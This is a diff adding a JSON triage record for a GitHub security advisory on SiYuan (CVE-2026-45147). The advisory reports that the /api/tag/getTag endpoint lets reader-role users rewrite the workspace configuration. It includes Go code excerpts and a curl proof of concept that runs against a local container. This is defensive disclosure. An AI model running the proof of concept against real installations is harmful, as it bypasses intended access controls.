@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/72287279?v=4\", \"events_url\": \"https://api.github.com/users/StarPlatinu/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/StarPlatinu/followers\", \"following_url\": \"https://api.github.com/users/StarPlatinu/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/StarPlatinu/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/StarPlatinu\", \"id\": 72287279, \"login\": \"StarPlatinu\", \"node_id\": \"MDQ6VXNlcjcyMjg3Mjc5\", \"organizations_url\": \"https://api.github.com/users/StarPlatinu/orgs\", \"received_events_url\": \"https://api.github.com/users/StarPlatinu/received_events\", \"repos_url\": \"https://api.github.com/users/StarPlatinu/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/StarPlatinu/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/StarPlatinu/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/StarPlatinu\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-45147\", \"cvss\": {\"score\": 4.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 4.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-285\", \"name\": \"Improper Authorization\"}, {\"cwe_id\": \"CWE-862\", \"name\": \"Missing Authorization\"}], \"description\": \"### Summary\\n\\n`POST /api/tag/getTag` is registered with `model.CheckAuth` only, omitting both `model.CheckAdminRole` and `model.CheckReadonly`, despite the handler performing a configuration write that is normally guarded by both. Any authenticated user — including publish-service `RoleReader` accounts and `RoleEditor` accounts on a read-only workspace — can call this endpoint with a `sort` argument to mutate `model.Conf.Tag.Sort` and trigger `model.Conf.Save()`, which atomically rewrites the entire workspace `conf.json`.\\n\\nSame root-cause class as the patched `GHSA-4j3x-hhg2-fm2x` (which fixed missing `CheckAdminRole + CheckReadonly` on `/api/template/renderSprig`).\\n\\n### Details\\n\\n**Affected files / lines (v3.6.5):**\\n\\n`kernel/api/router.go:170` — only `CheckAuth`:\\n\\n```go\\nginServer.Handle(\\\"POST\\\", \\\"/api/tag/getTag\\\", model.CheckAuth, getTag)\\n// Compare the sibling registrations on the next two lines, which DO gate writes:\\nginServer.Handle(\\\"POST\\\", \\\"/api/tag/renameTag\\\", model.CheckAuth, model.CheckAdminRole, model.CheckReadonly, renameTag)\\nginServer.Handle(\\\"POST\\\", \\\"/api/tag/removeTag\\\", model.CheckAuth, model.CheckAdminRole, model.CheckReadonly, removeTag)\\n```\\n\\n`kernel/api/tag.go:28-64` — handler. The `if nil != arg[\\\"sort\\\"]` block writes config without any role check:\\n\\n```go\\nfunc getTag(c *gin.Context) {\\n    ret := gulu.Ret.NewResult()\\n    defer c.JSON(http.StatusOK, ret)\\n    arg, ok := util.JsonArg(c, ret)\\n    if !ok { return }\\n    ...\\n    if nil != arg[\\\"sort\\\"] {                    // ← unauthorized write path\\n        sortVal, ok := util.ParseJsonArg[float64](\\\"sort\\\", arg, ret, true, false)\\n        if !ok { return }\\n        model.Conf.Tag.Sort = int(sortVal)\\n        model.Conf.Save()                      // persists entire conf to <workspace>/conf/conf.json\\n    }\\n    ...\\n}\\n```\\n\\n`Conf.Save()` rewrites the **entire** configuration file, which means a malicious caller racing with a legitimate config change can roll back another user's setting (TOCTOU on the global config object).\\n\\n### PoC\\n\\nSame Docker setup as Advisory 1.\\n\\n```bash\\n# 1. Authenticate (any role with CheckAuth pass — admin used here for convenience).\\ncurl -s -c /tmp/sy.cookie -X POST http://127.0.0.1:6806/api/system/loginAuth \\\\\\n  -H 'Content-Type: application/json' -d '{\\\"authCode\\\":\\\"audittest\\\"}' >/dev/null\\n\\n# 2. Read current Conf.Tag.Sort.\\ncurl -s -b /tmp/sy.cookie -X POST http://127.0.0.1:6806/api/system/getConf \\\\\\n  -H 'Content-Type: application/json' -d '{}' \\\\\\n  | python3 -c \\\"import json,sys;print('Conf.Tag.Sort BEFORE =',json.load(sys.stdin)['data']['conf']['tag']['sort'])\\\"\\n# → Conf.Tag.Sort BEFORE = 4\\n\\n# 3. Mutate via the read-style endpoint.\\ncurl -s -b /tmp/sy.cookie -X POST http://127.0.0.1:6806/api/tag/getTag \\\\\\n  -H 'Content-Type: application/json' -d '{\\\"sort\\\": 7}'\\n# → {\\\"code\\\":0,\\\"msg\\\":\\\"\\\",\\\"data\\\":[]}\\n\\n# 4. Confirm in-memory.\\ncurl -s -b /tmp/sy.cookie -X POST http://127.0.0.1:6806/api/system/getConf \\\\\\n  -H 'Content-Type: application/json' -d '{}' \\\\\\n  | python3 -c \\\"import json,sys;print('Conf.Tag.Sort AFTER =',json.load(sys.stdin)['data']['conf']['tag']['sort'])\\\"\\n# → Conf.Tag.Sort AFTER = 7\\n\\n# 5. Confirm persisted to disk inside the container.\\ndocker exec siyuan-audit grep -o 'sort\\\":[0-9]*' /siyuan/workspace/conf/conf.json\\n# → sort\\\":7\\n```\\n\\nThe vulnerability is exposed to publish-mode `RoleReader` (default for any anonymous publish visitor) and to `RoleEditor` users on workspaces where the administrator has set `Editor.ReadOnly = true`.\\n\\n### Impact\\n\\nLimited direct damage — the writable field is only the tag display sort order. The pattern is concerning because:\\n\\n- It demonstrates the same gap that `GHSA-4j3x-hhg2-fm2x` was meant to flag broadly (missing `CheckAdminRole + CheckReadonly` on a read-style endpoint that performs writes); each occurrence has to be patched individually.\\n- `Conf.Save()` rewrites the whole file, so a write-race during a legitimate configuration change can overwrite unrelated user-set values.\\n- A publish-service Reader being able to mutate any server state at all violates the intended trust boundary.\", \"epss\": {\"percentage\": 0.00152, \"percentile\": 0.04702}, \"ghsa_id\": \"GHSA-6r88-8v7q-q4p2\", \"github_reviewed_at\": \"2026-05-13T15:32:35Z\", \"html_url\": \"https://github.com/advisories/GHSA-6r88-8v7q-q4p2\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-6r88-8v7q-q4p2\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-45147\"}], \"nvd_published_at\": \"2026-05-14T19:16:38Z\", \"published_at\": \"2026-05-13T15:32:35Z\", \"references\": [\"https://github.com/siyuan-note/siyuan/security/advisories/GHSA-6r88-8v7q-q4p2\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-45147\", \"https://github.com/advisories/GHSA-6r88-8v7q-q4p2\"], \"repository_advisory_url\": \"https://api.github.com/repos/siyuan-note/siyuan/security-advisories/GHSA-6r88-8v7q-q4p2\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/siyuan-note/siyuan\", \"summary\": \"SiYuan: Broken access control in `/api/tag/getTag` — Reader role can mutate `Conf.Tag.Sort` and persist to disk\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-15T23:45:18Z\", \"url\": \"https://api.github.com/advisories/GHSA-6r88-8v7q-q4p2\", \"vulnerabilities\": [{\"first_patched_version\": \"0.0.0-20260512140701-d7b77d945e0d\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/siyuan-note/siyuan/kernel\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 0.0.0-20260512140701-d7b77d945e0d\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-6r88-8v7q-q4p2",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/siyuan-note/siyuan/kernel: < 0.0.0-20260512140701-d7b77d945e0d"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-45147"
+    ],
+    "cvss_score": 4.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/siyuan-note/siyuan/kernel"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.126590Z",
+  "provenance": {
+    "content_sha256": "9e3a05d3348b36a75db5ca67f5a482831892fbdc5a4cf60ec3cadb57f7664484",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-13T15:32:35Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-6r88-8v7q-q4p2",
+  "status": "active",
+  "title": "SiYuan: Broken access control in `/api/tag/getTag` — Reader role can mutate `Conf.Tag.Sort` and persist to disk",
+  "updated_at": "2026-05-15T23:45:18Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-6r88-8v7q-q4p2"
+}
